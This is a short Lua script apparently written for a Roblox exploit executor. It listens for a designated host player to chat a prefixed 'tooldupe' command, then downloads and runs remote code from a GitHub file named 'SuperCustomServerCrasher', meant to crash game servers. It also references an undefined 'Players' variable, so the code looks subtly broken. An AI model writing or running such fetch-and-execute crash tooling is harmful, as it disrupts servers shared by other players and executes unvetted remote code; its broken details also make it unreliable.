if not game:IsLoaded() then game.Loaded:Wait() end
repeat wait() until workspace.Players:FindFirstChild(game.Players.LocalPlayer.Name)

local function playerfromuserid(userId)
    for _, player in pairs(Players:GetPlayers()) do
        if player.UserId == userId then
            return player
        end
    end
end

playerfromuserid(getgenv().Settings.host).Chatted:Connect(function(msg)
    if msg:match(getgenv().Settings.prefix.."tooldupe") then
        -- automatic crash start is almost done - I will update this soon
        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
    end
end)
